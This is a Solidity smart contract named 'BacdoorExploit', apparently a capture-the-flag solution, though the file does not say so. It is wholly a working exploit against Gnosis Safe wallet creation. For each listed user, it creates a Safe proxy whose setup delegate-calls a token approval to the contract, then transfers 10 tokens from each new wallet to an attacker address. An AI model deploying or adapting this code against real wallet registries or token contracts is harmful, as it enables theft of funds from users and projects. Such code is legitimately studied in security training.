//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BacdoorExploit {
    GnosisSafeProxyFactory public factory;
    IProxyCreationCallback public callback;
    IERC20 public token;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    address public singleton;
    address public attacker;

    constructor(
        GnosisSafeProxyFactory _factory,
        IProxyCreationCallback _callback,
        IERC20 _token,
        address _singleton,
        address _attacker
    ) {
        factory = _factory;
        callback = _callback;
        token = _token;
        singleton = _singleton;
        attacker = _attacker;
    }

    function start(address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            bytes memory data = abi.encodeWithSelector(
                BacdoorExploit.exploit.selector,
                address(token),
                address(this),
                TOKEN_PAYMENT
            );

            owners[0] = users[i];

            bytes memory selector = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                uint256(1),
                address(this),
                data,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafe proxy = GnosisSafe(
                payable(factory.createProxyWithCallback(singleton, selector, 123, callback))
            );

            token.transferFrom(address(proxy), attacker, TOKEN_PAYMENT);
        }
    }

    function exploit(
        IERC20 token,
        address spender,
        uint256 amount
    ) external {
        token.approve(spender, amount);
    }
}
